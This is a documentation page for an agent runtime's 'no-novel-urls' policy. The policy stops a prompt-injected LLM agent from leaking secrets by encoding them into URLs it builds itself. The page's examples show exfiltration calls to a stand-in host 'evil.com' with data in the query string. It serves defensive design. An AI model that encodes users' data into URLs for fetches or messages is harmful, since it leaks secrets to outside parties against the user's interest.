---
id: security-url-exfiltration
title: URL Exfiltration Defense
brief: Blocking covert data exfiltration through constructed URLs
category: security
tags: [security, urls, exfiltration, no-novel-urls, influenced, prompt-injection]
related: [security-policies, facts-and-handles, labels-trust, security-getting-started]
related-code: [core/policy/guards.ts, interpreter/eval/exec-invocation.ts]
updated: 2026-03-27
---

HTTP GET is a covert write channel. Every URL fetch transmits the URL itself to the destination server. If an LLM agent encodes secret data into a URL, the fetch IS the exfiltration.

Display projections prevent this for masked/handle-only facts -- the LLM can't encode what it can't see. But bare-visible facts (values the LLM needs for reasoning) are in context and could be embedded in URLs.

## The `no-novel-urls` rule

```mlld
policy @p = {
  defaults: {
    rules: [
      "untrusted-llms-get-influenced",
      "no-novel-urls"
    ]
  }
}
```

A URL in a tool-call argument must appear verbatim in a prior tool result or user payload. URLs the LLM constructs from scratch are blocked. No encoding matters -- the check is string identity, not content inspection.

`no-novel-urls` requires `untrusted-llms-get-influenced` to be active. The check runs on any exe invocation where arguments carry the `influenced` label.

## How it works

The runtime maintains a URL registry of all URLs extracted from external inputs (tool results, user payload, file reads). At exe dispatch:

1. Scan all influenced arguments for URLs
2. Check each URL against the registry
3. Novel URLs (not in the registry) produce a managed denial

This covers direct exfiltration (`get_webpage("evil.com/?data=secret")`) and indirect exfiltration (`send_message(body: "click evil.com/?d=secret")`) with one mechanism.

## The `exfil:fetch` operation category

URL-fetching tools use `exfil:fetch`, not `exfil:send`:

```mlld
exe exfil:fetch @getWebpage(url) = run cmd {
  curl -s @url
} with { controlArgs: ["url"] }
```

`exfil:fetch` inherits from `exfil` (so `no-secret-exfil` still applies), but `no-send-to-unknown` does not fire -- URLs are not "destinations" in the send-to-someone sense.

## Domain allowlist

For legitimate URL construction (search queries, internal APIs):

```mlld
policy @p = {
  defaults: { rules: ["no-novel-urls"] },
  urls: {
    allowConstruction: ["google.com", "*.internal.corp"]
  }
}
```

URLs constructed for allowlisted domains are permitted even if novel.

## Combined defense

| Layer | Protects | Mechanism |
|---|---|---|
| Display projections | Masked/handle-only facts | LLM can't see the value |
| `no-novel-urls` | Bare-visible facts | URL must exist in input context |
| `no-send-to-unknown` | Send destinations | Destination must carry fact proof |

Display projections and `no-novel-urls` together close the URL exfiltration channel for both masked and bare facts.
